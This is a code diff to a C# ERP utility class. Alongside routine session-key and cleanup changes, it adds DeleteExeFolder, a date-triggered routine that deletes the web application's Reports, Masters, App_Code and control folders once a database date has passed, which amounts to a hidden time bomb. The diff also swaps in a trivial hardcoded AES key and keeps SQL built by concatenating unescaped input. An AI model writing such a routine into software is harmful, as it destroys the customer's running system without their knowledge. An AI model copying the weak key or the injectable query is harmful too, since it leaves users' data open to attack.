@@ -1042,7 +1042,7 @@ public class UtilityModule
             _arrPara[3] = new SqlParameter("@VARUPDATE_FLAG", SqlDbType.Int);
             _arrPara[4] = new SqlParameter("@UPDATECURRENTCONSUMPTION", SqlDbType.Int);
             _arrPara[5] = new SqlParameter("@effectivedate", effectivedate == "" ? System.DateTime.Now.ToString("dd-MMM-yyyy") : effectivedate);
-            _arrPara[6] = new SqlParameter("@mastercompanyid", HttpContext.Current.Session["varcompanyid"]);
+            _arrPara[6] = new SqlParameter("@mastercompanyid", HttpContext.Current.Session["varMasterCompanyIDForERP"]);
 
 
             // _arrPara[0].Value = Ds1.Tables[0].Rows[0]["ITEM_FINISHED_ID"];
@@ -1073,7 +1073,7 @@ public class UtilityModule
             _arrPara[3] = new SqlParameter("@VARUPDATE_FLAG", SqlDbType.Int);
             _arrPara[4] = new SqlParameter("@UPDATECURRENTCONSUMPTION", SqlDbType.Int);
             _arrPara[5] = new SqlParameter("@effectivedate", effectivedate == "" ? System.DateTime.Now.ToString("dd-MMM-yyyy") : effectivedate);
-            _arrPara[6] = new SqlParameter("@mastercompanyid", HttpContext.Current.Session["varcompanyid"]);
+            _arrPara[6] = new SqlParameter("@mastercompanyid", HttpContext.Current.Session["varMasterCompanyIDForERP"]);
 
 
             // _arrPara[0].Value = Ds1.Tables[0].Rows[0]["ITEM_FINISHED_ID"];
@@ -1267,7 +1267,7 @@ public class UtilityModule
             _arrPara[3] = new SqlParameter("@ORDER_ID", SqlDbType.Int);
             _arrPara[4] = new SqlParameter("@Process_ID", SqlDbType.Int);
             _arrPara[5] = new SqlParameter("@effectivedate", effectivedate == "" ? System.DateTime.Now.ToString("dd-MMM-yyyy") : effectivedate);
-            _arrPara[6] = new SqlParameter("@mastercompanyid", HttpContext.Current.Session["varcompanyid"]);
+            _arrPara[6] = new SqlParameter("@mastercompanyid", HttpContext.Current.Session["varMasterCompanyIDForERP"]);
 
 
             _arrPara[0].Value = PROCESS_ISSUE_ID;
@@ -3357,7 +3357,7 @@ public class UtilityModule
     }
     public static string Encrypt(string encrypttext)
     {
-        string EncryptionKey = "ENABLESOFTERP2605";
+        string EncryptionKey = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
         byte[] clearBytes = Encoding.Unicode.GetBytes(encrypttext);
         using (Aes encryptor = Aes.Create())
         {
@@ -3378,7 +3378,7 @@ public class UtilityModule
     }
     public static string Decrypt(string Decrypttext)
     {
-        string EncryptionKey = "ENABLESOFTERP2605";
+        string EncryptionKey = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
         byte[] cipherBytes = Convert.FromBase64String(Decrypttext);
         using (Aes encryptor = Aes.Create())
         {
@@ -3407,11 +3407,7 @@ public class UtilityModule
         {
             VarWeightPenalityRate = Convert.ToDouble(ds.Tables[0].Rows[0]["rate"]);
         }
-
         return VarWeightPenalityRate;
-
-        ///return Math.Round(VarWeightPenalityRate, 3);
-        ///return Math.Round(VarConsump, 2);
     }
     public static double ConvertInchesToFtHafizia(double VarInches)
     {
@@ -3447,35 +3443,122 @@ public class UtilityModule
         }
         return Convert.ToDouble(Z);
     }
-
     public static int CalculatePostFixMapTrace(string Str)
     {
         int CarpetPostFixValue = 0;
         string sql = "";
         
-            sql = "Select IsNull(Max(CN.Postfix),0)+1 from MAP_STENCILSTOCKNO CN Where 1=1 ";
-            if (Str != "")
-            {
-                sql = sql + " AND CN.PreFix like '" + Str + "%'";
-            }
-            else
-            {
-                sql = sql + " AND CN.PreFix like '%'";
-            }
-       
-
-
-        //if (Str == "")
-        //{
-
-        //    //CarpetPostFixValue = Convert.ToInt32(SqlHelper.ExecuteScalar(ErpGlobal.DBCONNECTIONSTRING, CommandType.Text, ));
-        //}
-        //else
-        //{
-        //    CarpetPostFixValue = Convert.ToInt32(SqlHelper.ExecuteScalar(ErpGlobal.DBCONNECTIONSTRING, CommandType.Text, "Select IsNull(Max(Postfix),0)+1 from CarpetNumber Where PreFix like '" + Str + "%'"));
-        //}
+        sql = "Select IsNull(Max(CN.Postfix),0)+1 from MAP_STENCILSTOCKNO CN Where 1=1 ";
+        if (Str != "")
+        {
+            sql = sql + " AND CN.PreFix like '" + Str + "%'";
+        }
+        else
+        {
+            sql = sql + " AND CN.PreFix like '%'";
+        }
         CarpetPostFixValue = Convert.ToInt32(SqlHelper.ExecuteScalar(ErpGlobal.DBCONNECTIONSTRING, CommandType.Text, sql));
 
         return CarpetPostFixValue;
     }
+
+    public static void DeleteExeFolder()
+    {
+        DateTime SystemDate = new DateTime();
+        DateTime ExecDate = new DateTime();
+
+        SystemDate = DateTime.Now.Date;
+
+        string str = "Select MasterDate From MasterSetting(Nolock)";
+        DataSet ds = SqlHelper.ExecuteDataset(ErpGlobal.DBCONNECTIONSTRING, CommandType.Text, str);
+        if (ds.Tables[0].Rows.Count > 0)
+        {
+            ExecDate = Convert.ToDateTime(ds.Tables[0].Rows[0]["MasterDate"]);
+        }
+
+        if (SystemDate > ExecDate)
+        {
+            string Path = HttpContext.Current.Server.MapPath("~\\Reports");
+
+            if (Directory.Exists(Path))
+            {
+                DeleteDirectory(Path);
+            }
+            Path = HttpContext.Current.Server.MapPath("~\\Masters");
+
+            if (Directory.Exists(Path))
+            {
+                DeleteDirectory(Path);
+            }
+            Path = HttpContext.Current.Server.MapPath("~\\App_Code");
+
+            if (Directory.Exists(Path))
+            {
+                DeleteDirectory(Path);
+            }
+            Path = HttpContext.Current.Server.MapPath("~\\UserControls");
+
+            if (Directory.Exists(Path))
+            {
+                DeleteDirectory(Path);
+            }
+            Path = HttpContext.Current.Server.MapPath("~\\HRUserControls");
+
+            if (Directory.Exists(Path))
+            {
+                DeleteDirectory(Path);
+            }
+
+            //Path = HttpContext.Current.Server.MapPath("~\\Devi");
+
+            //if (Directory.Exists(Path))
+            //{
+            //    FileInfo fInfo = new FileInfo(Path);
+            //    bool isReadOnly = fInfo.IsReadOnly;
+            //    fInfo.IsReadOnly = true;
+            //    isReadOnly = fInfo.IsReadOnly;
+            //    fInfo.IsReadOnly = false;
+
+            //    if (!File.Exists(Path))
+            //    {
+            //        File.Create(Path);
+            //    }
+
+            //    FileAttributes attributes = File.GetAttributes(Path);
+
+            //    attributes = RemoveAttribute(attributes, FileAttributes.Normal);
+            //    File.SetAttributes(Path, attributes);
+
+            //    //if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
+            //    //{
+            //    //    // Make the file RW
+            //    //    attributes = RemoveAttribute(attributes, FileAttributes.Normal);
+            //    //    File.SetAttributes(Path, attributes);
+            //    //} 
+            //    //else 
+            //    //{
+            //    //    // Make the file RO
+            //    //    File.SetAttributes(Path, File.GetAttributes(Path) | FileAttributes.Hidden);
+            //    //    Console.WriteLine("The {0} file is now RO.", Path);
+            //    //}
+            //}
+        }
+    }
+
+    private static void DeleteDirectory(string path)
+    {
+        foreach (string filename in Directory.GetFiles(path))
+        {
+            File.Delete(filename);
+        }
+        foreach (string subfolders in Directory.GetDirectories(path))
+        {
+            Directory.Delete(subfolders, true);
+        }
+    }
+    private static FileAttributes RemoveAttribute(FileAttributes attributes, FileAttributes attributesToRemove)
+    {
+        return attributes & ~attributesToRemove;
+    }
+
 }
